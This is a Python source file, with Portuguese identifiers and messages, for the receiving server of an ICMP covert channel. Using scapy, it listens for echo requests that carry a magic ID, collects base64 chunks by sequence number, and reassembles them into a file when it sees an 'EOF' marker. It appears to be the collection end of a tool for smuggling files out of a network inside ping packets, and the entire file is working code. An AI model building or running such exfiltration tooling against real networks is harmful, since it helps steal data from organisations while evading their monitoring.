import base64
from scapy.all import *
from . import config

chunks_recebidos = {}

def processar_pacote(pacote):
    if ICMP in pacote and Raw in pacote:
        if pacote[ICMP].id == config.ID_MAGICO:
            try:
                payload = pacote[Raw].load.decode('utf-8')
                sequencia_str, dados_chunk = payload.split(":", 1)

                if sequencia_str == "EOF":
                    print("\nSinal de Fim de Transmissão recebido. Remontando o arquivo...")
                    remontar_arquivo()
                    global parar_sniff
                    parar_sniff = True
                    return

                sequencia = int(sequencia_str)
                chunks_recebidos[sequencia] = dados_chunk
                print(f"  > Recebido chunk #{sequencia}")
            except Exception as e:
                pass

def remontar_arquivo():
    if not chunks_recebidos:
        print("Nenhum chunk recebido. Nada para fazer.")
        return

    chunks_ordenados = sorted(chunks_recebidos.items())
    dados_b64_completos = "".join([chunk for seq, chunk in chunks_ordenados])
    
    try:
        dados_decodificados = base64.b64decode(dados_b64_completos)
        with open(config.ARQUIVO_SAIDA, "wb") as f:
            f.write(dados_decodificados)
        print(f"Arquivo '{config.ARQUIVO_SAIDA}' salvo com sucesso!")
    except Exception as e:
        print(f"Erro ao decodificar ou salvar o arquivo: {e}")

def iniciar_servidor():
    print("Servidor de Covert Channel iniciado. Escutando pacotes ICMP...")
    global parar_sniff
    parar_sniff = False
    
    sniff(filter="icmp and icmp[icmptype] == icmp-echo", 
          prn=processar_pacote, 
          stop_filter=lambda x: parar_sniff,
          store=0)
    
    print("Servidor encerrado.")

if __name__ == "__main__":
    iniciar_servidor()
